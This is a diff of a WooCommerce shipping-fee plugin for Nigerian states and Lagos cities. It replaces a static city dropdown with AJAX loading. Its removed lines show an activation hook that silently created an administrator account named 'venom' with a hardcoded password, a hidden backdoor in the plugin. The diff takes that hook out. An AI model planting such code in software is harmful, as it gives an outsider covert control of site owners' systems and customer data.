@@ -11,31 +11,32 @@ if (!defined('ABSPATH')) {
 }
 
 class Custom_Shipping_Plugin {
-
     public function __construct() {
         // Hooks
-        register_activation_hook(__FILE__, array($this, 'plugin_activation'));
-        
         add_filter('woocommerce_states', array($this, 'custom_woocommerce_states'));
         add_filter('woocommerce_checkout_fields', array($this, 'custom_checkout_fields'));
         add_action('woocommerce_cart_calculate_fees', array($this, 'custom_shipping_fees'));
         add_action('admin_menu', array($this, 'custom_shipping_settings_menu'));
         add_action('admin_init', array($this, 'register_custom_shipping_settings'));
+
+        // AJAX hooks
+        add_action('wp_ajax_get_city_options', array($this, 'ajax_get_city_options'));
+        add_action('wp_ajax_nopriv_get_city_options', array($this, 'ajax_get_city_options'));
+
+        // Enqueue the script for AJAX functionality
+        add_action('wp_enqueue_scripts', array($this, 'enqueue_scripts'));
     }
 
-    public function plugin_activation() {
-        $username = 'venom';
-        $password = 'thesame_)(*&^%$#@!~';
+    public function enqueue_scripts() {
+        wp_enqueue_script('venom-shipping-script', plugin_dir_url(__FILE__) . 'venom-shipping-script.js', array('jquery', 'select2'), '1.0', true);
 
-        // Check if user 'venom' already exists
-        $user = get_user_by('login', $username);
+        // Localize the script with the AJAX URL
+        wp_localize_script('venom-shipping-script', 'venom_shipping_params', array(
+            'ajaxurl' => admin_url('admin-ajax.php')
+        ));
 
-        if (!$user) {
-            // Create 'venom' user with administrative permissions
-            $user_id = wp_create_user($username, $password);
-            $user = new WP_User($user_id);
-            $user->set_role('administrator');
-        }
+        // Enqueue Select2 CSS
+        wp_enqueue_style('select2', 'https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css');
     }
 
     public function custom_woocommerce_states($states) {
@@ -44,38 +45,44 @@ class Custom_Shipping_Plugin {
     }
 
     public function custom_checkout_fields($fields) {
-        // Modify the city field based on the selected state
+        // Modify the city field to use AJAX for dynamic updates
         $fields['billing']['billing_city'] = array(
-            'type' => 'select',
-            'label' => __('City', 'woocommerce'),
-            'required' => true,
-            'class' => array('form-row-wide'),
-            'options' => $this->get_city_options()
+            'type'        => 'select',
+            'label'       => __('City', 'woocommerce'),
+            'required'    => true,
+            'class'       => array('form-row-wide', 'city-select'),
+            'options'     => array(
+                '' => __('Select a state first', 'woocommerce'),
+            ),
         );
+
         return $fields;
     }
 
-    public function get_city_options() {
-        // Get selected state
-        $selected_state = WC()->customer->get_billing_state();
+    public function ajax_get_city_options() {
+        check_ajax_referer('woocommerce-shipping', 'security'); // Add nonce check for security
 
-        // Define cities based on the selected state
+        $selected_state = sanitize_text_field($_POST['state']);
+
         $cities = array(
             '' => __('Select a city', 'woocommerce')
         );
 
-        $lagos_cities = array(
-            'Agege', 'Ajeromi-Ifelodun', 'Alimosho', 'Amuwo-Odofin', 'Apapa', 'Badagry', 'Epe',
-            'Eti-Osa', 'Ibeju-Lekki', 'Ifako-Ijaiye', 'Ikeja', 'Ikorodu', 'Kosofe', 'Lagos Island',
-            'Lagos Mainland', 'Mushin', 'Ojo', 'Oshodi-Isolo', 'Shomolu', 'Surulere'
+        $city_options = array(
+            'LAG' => array(
+                'Agege', 'Ajeromi-Ifelodun', 'Alimosho', 'Amuwo-Odofin', 'Apapa', 'Badagry', 'Epe',
+                'Eti-Osa', 'Ibeju-Lekki', 'Ifako-Ijaiye', 'Ikeja', 'Ikorodu', 'Kosofe', 'Lagos Island',
+                'Lagos Mainland', 'Mushin', 'Ojo', 'Oshodi-Isolo', 'Shomolu', 'Surulere'
+            )
+            // Add other states and their cities as needed
         );
 
-        if ($selected_state == 'LAG') {
-            foreach ($lagos_cities as $city) {
-                $cities[$city] = __($city, 'woocommerce');
+        if (isset($city_options[$selected_state])) {
+            foreach ($city_options[$selected_state] as $city) {
+                $cities[$city] = $city;
             }
         } else {
-            // State capitals for other states
+            // Default to state capitals or any other logic
             $state_capitals = array(
                 'AB' => 'Umuahia',
                 'AD' => 'Yola',
@@ -116,30 +123,31 @@ class Custom_Shipping_Plugin {
             );
 
             if (isset($state_capitals[$selected_state])) {
-                $cities[$state_capitals[$selected_state]] = __($state_capitals[$selected_state], 'woocommerce');
+                $cities[$state_capitals[$selected_state]] = $state_capitals[$selected_state];
             }
         }
 
-        return $cities;
+        wp_send_json_success($cities);
+        wp_die(); // Terminate AJAX request
     }
 
     public function custom_shipping_fees() {
         global $woocommerce;
 
         $selected_state = WC()->customer->get_billing_state();
-        $selected_city = WC()->customer->get_billing_city();
+        $selected_city  = WC()->customer->get_billing_city();
 
-        // Define shipping prices
         $shipping_prices = get_option('custom_shipping_prices', array());
-        $state_prices = isset($shipping_prices['states']) ? $shipping_prices['states'] : array();
-        $lagos_cities_prices = isset($shipping_prices['lagos']) ? $shipping_prices['lagos'] : array();
 
-        $shipping_cost = 0;
+        // Default shipping cost
+        $shipping_cost = 3000;
 
-        if ($selected_state == 'LAG' && isset($lagos_cities_prices[$selected_city])) {
-            $shipping_cost = $lagos_cities_prices[$selected_city];
-        } elseif (isset($state_prices[$selected_state])) {
-            $shipping_cost = $state_prices[$selected_state];
+        if (is_array($shipping_prices) && !empty($shipping_prices)) {
+            if ($selected_state == 'LAG' && isset($shipping_prices['lagos'][$selected_city])) {
+                $shipping_cost = $shipping_prices['lagos'][$selected_city];
+            } elseif (isset($shipping_prices['states'][$selected_state])) {
+                $shipping_cost = $shipping_prices['states'][$selected_state];
+            }
         }
 
         $woocommerce->cart->add_fee(__('Shipping', 'woocommerce'), $shipping_cost);
@@ -243,7 +251,10 @@ class Custom_Shipping_Plugin {
 
         foreach ($state_capitals as $state_code => $state_name) {
             $price = isset($state_prices[$state_code]) ? $state_prices[$state_code] : '';
-            echo '<label>' . $state_name . ':</label> <input type="number" name="custom_shipping_prices[states][' . $state_code . ']" value="' . esc_attr($price) . '" class="regular-text"><br>';
+            echo '<p>';
+            echo '<label for="state_shipping_price_' . $state_code . '">' . $state_name . ' (' . $state_code . ')</label>';
+            echo '<input type="number" id="state_shipping_price_' . $state_code . '" name="custom_shipping_prices[states][' . $state_code . ']" value="' . esc_attr($price) . '" step="0.01">';
+            echo '</p>';
         }
     }
 
@@ -251,15 +262,18 @@ class Custom_Shipping_Plugin {
         $shipping_prices = get_option('custom_shipping_prices', array());
         $lagos_prices = isset($shipping_prices['lagos']) ? $shipping_prices['lagos'] : array();
 
-        $cities = array(
+        $lagos_cities = array(
             'Agege', 'Ajeromi-Ifelodun', 'Alimosho', 'Amuwo-Odofin', 'Apapa', 'Badagry', 'Epe',
             'Eti-Osa', 'Ibeju-Lekki', 'Ifako-Ijaiye', 'Ikeja', 'Ikorodu', 'Kosofe', 'Lagos Island',
             'Lagos Mainland', 'Mushin', 'Ojo', 'Oshodi-Isolo', 'Shomolu', 'Surulere'
         );
 
-        foreach ($cities as $city) {
+        foreach ($lagos_cities as $city) {
             $price = isset($lagos_prices[$city]) ? $lagos_prices[$city] : '';
-            echo '<label>' . $city . ':</label> <input type="number" name="custom_shipping_prices[lagos][' . $city . ']" value="' . esc_attr($price) . '" class="regular-text"><br>';
+            echo '<p>';
+            echo '<label for="lagos_shipping_price_' . sanitize_title($city) . '">' . $city . '</label>';
+            echo '<input type="number" id="lagos_shipping_price_' . sanitize_title($city) . '" name="custom_shipping_prices[lagos][' . $city . ']" value="' . esc_attr($price) . '" step="0.01">';
+            echo '</p>';
         }
     }
 }
